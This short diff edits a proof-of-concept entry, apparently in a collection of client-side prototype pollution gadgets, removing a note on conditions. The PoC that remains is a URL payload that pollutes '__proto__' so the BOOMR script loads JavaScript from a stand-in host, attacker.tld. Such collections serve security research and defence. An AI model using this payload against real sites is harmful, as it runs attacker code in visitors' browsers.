@@ -21,10 +21,6 @@ function promote() {
 
 ### PoC
 
-Сonditions:
-
-* The Prototype Pollution script should automatically cast numeric strings to numbers (for example [jQuery query-object](/pp/jquery-query-object.md))
-
 ```
 ?__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js
 ```
